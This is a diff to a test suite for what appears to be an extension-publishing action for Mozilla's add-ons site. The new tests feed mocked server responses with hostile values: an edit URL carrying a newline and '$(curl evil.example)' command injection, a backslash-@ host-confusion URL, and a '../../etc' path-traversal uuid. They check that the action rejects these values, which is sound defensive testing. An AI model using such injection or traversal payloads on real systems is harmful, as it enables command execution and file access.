@@ -163,6 +163,7 @@ describe('publishToAmo: new versions', () => {
     await run;
     assert.deepEqual(amo.requests.at(-1)!.json, { release_notes: { 'en-US': 'New popup.' }, approval_notes: 'npm run build' });
     assert.equal(created().approvalNotes, 'npm run build');
+    assert.ok(run.lines.includes(`Created version 2.0.0 (id ${created().id}) in the listed channel, with the source ZIP. File status: unreviewed.`));
     assert.ok(run.lines.includes('Set the release notes and approval notes.'));
   });
 
@@ -783,6 +784,15 @@ describe('publishToAmo: existing versions', () => {
     const broken = publish('1.4.0');
     await broken;
     assert.equal(broken.outputs['edit-url'], undefined);
+    for (const editUrl of [`${amo.base}/en-US/\n$(curl evil.example)`, `${amo.base}\\@evil.example/`, `${amo.base}/en-US/\tx`]) {
+      amo.reset();
+      seed('1.4.0', { channel: 'listed' });
+      amo.fault('version', { mutate: (body) => ({ ...body, edit_url: editUrl }) });
+      const odd = publish('1.4.0', { channel: 'listed' });
+      await odd;
+      assert.equal(odd.outputs['edit-url'], undefined, JSON.stringify(editUrl));
+      assert.ok(odd.lines.includes('Mozilla reviews listed versions; signing can take 24 hours or longer, and any version can still be reviewed later.'));
+    }
   });
 });
 
@@ -879,13 +889,20 @@ describe('publishToAmo: upload and create refusals', () => {
     amo.reset();
     amo.fault('version:create', { mutate: (body) => ({ ...body, channel: 'listed' }) });
     const error = await rejection(publish('1.4.0'));
-    assert.match(text(error), /with channel = "listed", which this version of the action does not know\.\nThe v5 API may have changed\. The package was uploaded to AMO, but no version was created\./);
+    assert.match(text(error), /with channel = "listed", which this version of the action does not know\.\nThe v5 API may have changed\. Version 1\.4\.0 was created on AMO\.$/);
+    assert.equal(created().channel, 'unlisted');
     amo.reset();
     amo.fault('upload:create', { mutate: (body) => ({ ...body, channel: 'listed' }) });
-    assert.match(text(await rejection(publish('1.4.0'))), /with channel = "listed".*\nThe v5 API may have changed\. Nothing was uploaded\./s);
+    assert.match(text(await rejection(publish('1.4.0'))), /with channel = "listed".*\nThe v5 API may have changed\. The package was uploaded to AMO, but no version was created\.$/s);
+    assert.equal(amo.uploads.length, 1);
     amo.reset();
     amo.fault('upload:create', { mutate: (body) => ({ ...body, uuid: '../../etc' }) });
-    assert.match((await rejection(publish('1.4.0'))).message, /with uuid = "\.\.\/\.\.\/etc"/);
+    const uuid = await rejection(publish('1.4.0'));
+    assert.match(uuid.message, /with uuid = "\.\.\/\.\.\/etc"/);
+    assert.equal(uuid.details, 'The v5 API may have changed. The package was uploaded to AMO, but no version was created.');
+    amo.reset();
+    amo.fault('version:create', { mutate: (body) => ({ ...body, file: { ...body.file, status: 'nominated' } }) });
+    assert.match(text(await rejection(publish('1.4.0'))), /with file\.status = "nominated".*\nThe v5 API may have changed\. Version 1\.4\.0 was created on AMO\.$/s);
   });
 });
 
